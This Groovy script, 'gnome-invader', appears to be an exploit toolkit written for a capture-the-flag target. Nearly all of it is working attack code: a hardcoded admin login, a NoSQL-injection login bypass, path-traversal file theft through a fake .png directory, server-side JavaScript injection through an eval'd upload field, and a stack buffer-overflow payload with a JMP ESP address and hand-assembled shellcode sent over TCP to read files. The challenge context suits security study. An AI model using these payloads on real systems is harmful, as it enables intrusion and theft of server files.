import org.apache.http.HttpEntity
import org.apache.http.HttpHost
import org.apache.http.HttpResponse
import org.apache.http.NameValuePair
import org.apache.http.ProtocolVersion
import org.apache.http.RequestLine
import org.apache.http.client.HttpClient
import org.apache.http.client.entity.UrlEncodedFormEntity
import org.apache.http.client.methods.HttpGet
import org.apache.http.client.methods.HttpPost
import org.apache.http.client.utils.URIBuilder
import org.apache.http.entity.ContentType
import org.apache.http.entity.StringEntity
import org.apache.http.entity.mime.FormBodyPart
import org.apache.http.entity.mime.FormBodyPartBuilder
import org.apache.http.entity.mime.HttpMultipartMode
import org.apache.http.entity.mime.MultipartEntityBuilder
import org.apache.http.entity.mime.content.StringBody
import org.apache.http.impl.client.HttpClientBuilder
import org.apache.http.message.BasicNameValuePair
import org.apache.http.message.BasicRequestLine
import org.apache.http.util.EntityUtils

// Definitions

enum Receipe {
    LOGIN,
    EXPRESS_LOGIN,
    CAM_DOWNLOAD,
    DOWNLOAD,
    UPLOAD_DOWNLOAD,
    FILES,
    PROBE,
    SPIKE
};

class HttpRaw extends HttpGet {

  final private String rawUri

  public HttpRaw(String rawUri) {
    super(rawUri)
    this.rawUri=rawUri
  }

  // HttpGet inplementation

  @Override
  public RequestLine getRequestLine() {
    final String method = getMethod()
    final ProtocolVersion ver = getProtocolVersion()

    BasicRequestLine brl=new BasicRequestLine(method, rawUri, ver)

    println "over-riding url with ${brl}"

    return brl
  }
}

class TcpInvader {

  public SocketAddress addr
  public Socket conn

  private BufferedOutputStream outs
  private BufferedInputStream ins

  // Create new

  public TcpInvader() {
  }

  public void connect() {

    this.conn=new Socket()

    this.conn.connect(this.addr)

    this.ins=new BufferedInputStream(this.conn.inputStream)
    this.outs=new BufferedOutputStream(this.conn.outputStream)

    println("Connected to ${addr}")
  }

  public void closeQuietly() {
    try {
      this.conn.close()
    }
    catch(t) {
      println("ignoring close error (e=${t})")
    }
  }

  public void probe() {
    connect()

    this.outs.write((byte)'1')
    this.outs.flush()

    drain()

    closeQuietly()
  }

  class Encoder {

    private List data;

    public Encoder() {
      this.data=[]
    }

    public byte[] raw() {
      byte[] res=new byte[data.size()]
      for (int i=0;i<res.length;i++)
        res[i]=(byte)data.get(i)
      return res
    }

    public int length() {
      return data.size()
    }

    public Encoder pad(int length) {
      for (int i=0;i<length;i++)
        data.add(0x55)
      return this
    }

    public Encoder b(int v) {
      data.add(v)
      return this
    }

    public Encoder w(long w) {
      data.add((w>>0) &0xff)
      data.add((w>>8) &0xff)
      data.add((w>>16)&0xff)
      data.add((w>>24)&0xff)
      return this
    }

    public Encoder s(String v) {
      for (int i=0;i<v.length();i++) {
        data.add((byte)v.charAt(i))
      }
      data.add(0x0)
      return this
    }
  }

  public void spike(String name) {
    connect()

    String path = "/gnome/www/files/"+name

    this.outs.write((byte)'X')
    this.outs.flush()

    waitFor("This function is protected!\n\0")

    Encoder enc=new Encoder()

    enc
      .pad(104)                     // &bin array
      .w(0xe4ffffe4)                // canary
      .w(0x66666666)                // Fake EBP
      .w(0x0804936b)                // JMPESP

      .b(0x89).b(0xe0)            //  mov    %esp,%eax
      .b(0x05).w(0x478)           //  add    $0x478,%eax
      .b(0x89).b(0xc5)            //  mov    %eax,%ebp
      .b(0x83).b(0xec).b(0x10)    //  sub    $0x10,%esp     -- move ESP before shell
      .b(0xc7).b(0x44).b(0x24)    //  mov    $0x8049c70,0x4(%esp)
        .b(0x04)
        .w(0x8049c70)
      .b(0x89).b(0xe0)            //  mov %esp,%eax
      .b(0x83).b(0xc0).b(0x36)    //  add $0x36,%eax        -- SHELL+38 = SHELL-16+54 = data
      .b(0x89).b(0x04).b(0x24)    //  mov %eax,(%esp)
      .b(0xb8).w(0x8048dcf)       //  mov $0x8048dcf,%eax
      .b(0xff).b(0xe0)            //  jmp *%eax
      .pad(3)
      .s("base64 "+path)         //  data

    byte[] payload=enc.raw()

    // Limit is 200!
    println "payload=${payload} [ ${payload.size()} ]"

    this.outs.write(payload)
    this.outs.flush()
    this.conn.shutdownOutput()

    downloadTo(name)

    closeQuietly()
  }

  // Implementation

  /** Wait for string */
  protected void waitFor(String marker) {
    StringBuffer sb=new StringBuffer()
    for(;;) {
      char c=(char)this.ins.read()
      sb.append(c)
      print c
      if (sb.toString().endsWith(marker)) {
        println "\nMatched [${marker}]"
        return
      }
    }
  }

  void downloadTo(String name) {
    FileOutputStream out=null;
    try {
      out=new FileOutputStream(name)
      byte[] raw=new byte[1024]
      int rb
      while ((rb=this.ins.read(raw))>0) {
        out.write(raw,0,rb)
      }
    }
    finally {
      out.close()
    }
  }


  /** Drain */
  protected void drain() {
    byte[] raw=new byte[100]
    int rb
    while ((rb=this.ins.read(raw))>0) {
      System.out.write(raw,0,rb)
    }
  }
}

class HttpInvader {

  public HttpHost target
  public HttpClient http
  public String sessionId

  // Create new

  public HttpInvader() {
    http=HttpClientBuilder.create().build()
  }

  // Login

  void fetchSession() {

    HttpGet fetchReq = new HttpGet("http://" + target.toHostString() + "/")

    HttpResponse resp = http.execute(fetchReq)

    println "fetchSession ok"
  }

  void login() {

    fetchSession()

    println("login to ${target}")

    HttpPost loginReq = new HttpPost("http://" + target.toHostString() + "/")

    List <NameValuePair> params=new ArrayList <NameValuePair>();
    params.add(new BasicNameValuePair("username", "admin"));
    params.add(new BasicNameValuePair("password", "SittingOnAShelf"));

    loginReq.setEntity(new UrlEncodedFormEntity(params));

    HttpResponse resp = http.execute(loginReq)

    String html=EntityUtils.toString(resp.entity)

    if (html.indexOf("Invalid username or password")>=0) {
      throw new IOException("Invalid username or password")
    }

    println "login ok"
  }

  void expressLogin() {

    fetchSession()

    println("expressLogin to ${target}")

    HttpPost loginReq = new HttpPost("http://" + target.toHostString() + "/")

    // Express.js hack @see http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html
    // Use $ne:user to avoid the level 10 user a/c
    loginReq.setEntity(new StringEntity('{"username":{"$ne":"user"},"password":{"$gt":""}}','application/json','UTF-8'))

    HttpResponse resp = http.execute(loginReq)

    String html=EntityUtils.toString(resp.entity)

    if (html.indexOf("Invalid username or password")>=0) {
      throw new IOException("Invalid username or password")
    }

    println "login ok"
   }

  void download(String path) {

    URI uri=new URIBuilder()
      .setScheme("http")
      .setHost(target.toHostString())
      .setPath("/files")
      .addParameter("d",path)
      .build()

    HttpGet fetchReq=new HttpGet(uri)

    HttpResponse resp=http.execute(fetchReq)

    downloadTo(path,resp)
  }

  String fakePng() {

    HttpPost settingsReq = new HttpPost("http://" + target.toHostString() + "/settings")

    List <NameValuePair> params=new ArrayList <NameValuePair>();
    params.add(new BasicNameValuePair("filen", "fake.png/nabac"));

    settingsReq.setEntity(new UrlEncodedFormEntity(params));

    HttpResponse resp = http.execute(settingsReq)

    String html=EntityUtils.toString(resp.entity)

    def matcher=(html =~ "Dir (.+) created successfully")

    if (!matcher) {
      throw new IOException("Failed to created .png directory")
    }

    println("match["+(matcher[0].join("|"))+"]")

    String dirName=matcher[0][1]

    println("created [${dirName}]")

    return dirName
  }

  void camDownload(String path) {

    // Create a valid directory in upload path containing .png
    String pngDir=fakePng().replace("/gnome/www/public","")+"../../../../files/"

    // assume we start from public/images
    String camPath=".."+pngDir+path

    HttpGet fetchReq=new HttpGet("http://"+target.toHostString()+"/cam?camera="+camPath)

    HttpResponse resp=http.execute(fetchReq)

    downloadTo(path,resp)
  }

  void files() {

    HttpGet fetchReq=new HttpGet("http://"+target.toHostString()+"/files")

    HttpResponse resp=http.execute(fetchReq)

    downloadTo("files.html",resp)
  }

  void uploadDownload(String path) {

    HttpPost uploadReq=new HttpPost("http://"+target.toHostString()+"/files");

    // JS injection using eval() @see http://s1gnalcha0s.github.io/node/2015/01/31/SSJS-webshell-injection.html
    String js="res.render=function(v,o,fn) { res.sendFile('/gnome/www/files/${path}') }"

    FormBodyPart postProc=FormBodyPartBuilder
      .create()
      .setName("postproc")
      .setBody(new StringBody(js))
      .build()

    MultipartEntityBuilder builder = MultipartEntityBuilder.create()
    builder.setMode(HttpMultipartMode.BROWSER_COMPATIBLE)
    builder.addBinaryBody("file","fake".getBytes(),ContentType.create("image/png"),"fake.png")
    builder.addPart(postProc)
    HttpEntity entity = builder.build()

    uploadReq.setEntity(entity)

    println("upload-hack to "+target)

    HttpResponse resp=http.execute(uploadReq)

    downloadTo(path,resp)
  }

  // Utility

  void downloadTo(String name, HttpResponse httpResp) {
    FileOutputStream out=null;
    try {
      out=new FileOutputStream(name)
      httpResp.entity.writeTo(out)
    }
    finally {
      out.close()
    }
  }

  void debugResponse(HttpResponse httpResp, Closure c) {
    println("http-response:${httpResp.statusLine}")
    httpResp.getAllHeaders().each { h -> println("  ${h}")}

    HttpEntity resp=httpResp.getEntity()

    c.curry(resp).run()

    EntityUtils.consume(resp)
  }
}

// Main

HttpInvader http=new HttpInvader()
TcpInvader tcp=new TcpInvader()
Receipe[] plan

try {
  Inet4Address targetAddr = InetAddress.getByName(args[0])
  plan = args[1].split(",").collect {Receipe.valueOf(it.toUpperCase())}

  http.target=new HttpHost(targetAddr,80)

  tcp.addr=new InetSocketAddress(args[0],4242)
}
catch(t) {
    System.err.println("error "+t)
    t.printStackTrace(System.err)
    System.err.println("Usage: gnome-invader [target] [program(,program)*]")
    System.exit(-1)
}

println("gnome-invader 1.0 - executing against ${http.target}")

String targetPath=args.length>2?args[2]:"gnome.conf"

try {
  plan.each({
    switch(it) {
      case Receipe.LOGIN:
        http.login()
        break
      case Receipe.EXPRESS_LOGIN:
        http.expressLogin()
        break
      case Receipe.DOWNLOAD:
        http.download(targetPath)
        break
      case Receipe.CAM_DOWNLOAD:
        http.camDownload(targetPath)
        break
      case Receipe.UPLOAD_DOWNLOAD:
        http.uploadDownload(targetPath)
        break
      case Receipe.FILES:
        http.files()
        break

      // TCP
      case Receipe.PROBE:
        tcp.probe()
        break
      case Receipe.SPIKE:
        tcp.spike(targetPath)
        break
    }
  })
}
catch(t) {
  System.err.println("error "+t)
  t.printStackTrace(System.err)
  System.exit(-1)
}

